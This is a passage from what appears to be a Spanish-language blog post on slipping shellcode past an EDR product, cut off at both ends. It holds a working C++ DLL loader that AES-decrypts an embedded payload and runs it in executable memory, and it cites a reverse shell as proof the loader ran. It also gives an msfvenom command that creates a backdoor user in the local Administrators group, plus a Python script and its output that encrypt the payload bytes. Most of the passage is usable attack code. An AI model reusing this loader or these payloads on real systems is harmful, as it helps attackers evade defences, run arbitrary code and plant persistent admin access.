<span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xa2</span> <span class="p">};</span>

<span class="k">extern</span> <span class="s">"C"</span> <span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="nf">Go</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>

    <span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
					<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
					<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>Evidencia de la ejecución:</p>

<p><img src="/assets/images/EDR_1_reverse_shell.png" alt="EDR reverse shell " /></p>

<h2 id="creación-de-un-nuevo-usuario-y-añadirlo-al-grupo-de-los-administradores-locales">Creación de un nuevo usuario y añadirlo al grupo de los administradores locales</h2>

<p>Del mismo modo tenemos la posibilidad de crear un comando que ejecute en el sistema operativo y que nos proporcione una escalada de privilegios así como persistencia, mediante msfvenom de metaexploit framework:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/exec CMD="net user add f0ns1 Passw0rd! &amp;&amp; net localgroup Administradores f0ns1 /add" --platform Windows &gt; raw_create_user_administradores.bin
</code></pre></div></div>

<p>Encriptamos el payload con criptografía simétrica mediante AES, script en python:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
<span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="n">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span>
<span class="kn">from</span> <span class="n">Crypto.Random</span> <span class="kn">import</span> <span class="n">get_random_bytes</span>
<span class="kn">import</span> <span class="n">hashlib</span>

<span class="n">KEY</span> <span class="o">=</span> <span class="nf">get_random_bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
<span class="n">iv</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">KEY</span><span class="p">).</span><span class="nf">digest</span><span class="p">(),</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">plaintext</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">File argument needed! %s &lt;raw payload file&gt;</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

<span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="nf">encrypt</span><span class="p">(</span><span class="nf">pad</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">))</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">AESkey[] = { 0x</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">'</span><span class="s">, 0x</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">KEY</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> };</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">payload[] = { 0x</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">'</span><span class="s">, 0x</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ciphertext</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> };</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>
<p>Salida del proceso:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="p">..</span>\<span class="n">aes</span><span class="p">.</span><span class="n">py</span> <span class="n">raw_create_user_administradores</span><span class="p">.</span><span class="nb">bin</span>
<span class="n">AESkey</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0x7f</span> <span class="p">};</span>
<span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span 